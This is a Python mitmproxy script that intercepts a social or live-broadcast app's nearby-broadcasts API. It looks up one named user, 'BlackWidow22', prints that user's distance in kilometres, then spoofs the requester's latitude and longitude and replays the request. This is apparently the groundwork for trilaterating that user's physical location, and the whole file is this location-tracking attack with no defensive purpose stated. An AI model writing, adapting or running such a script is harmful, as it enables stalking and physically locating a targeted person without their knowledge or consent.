#from libmproxy.protocol.http import decoded
import json
from mitmproxy import ctx

def response(flow):
    if flow.is_replay == "request":
        return
    #code to handle request flows
    if flow.request.pretty_url.endswith("getBroadcastsByNearbySort"): 
        flowDict = {}
        flowDict = flow.response.text
        flowDict = json.loads(flowDict)
        #print(flowDict['result']['broadcasts'])
        try:
            for user in flowDict['result']['broadcasts']:
                if (user['userDetails']['displayName'] == 'BlackWidow22'):
                    print(user['objectId'])
                    for userDist in flowDict['result']['metadata']['broadcasts']:
                        if(userDist['id'] == user['objectId']):
                            print("Distance in Km: ",userDist['distanceInKm'])
        except:
            print("Error")
        #print(flowDict.keys())
        # ["broadcasts"][0]["userDetails"]["displayName"])
        locDict = json.loads(flow.request.text)
        locDict['latitude'] = 40.70859984911362
        locDict['longitude'] = -74.04563828658722
        print(locDict)

        
        flow = flow.copy()
        flow.request.body = json.dumps(locDict)
        ctx.master.commands.call("replay.client", [flow])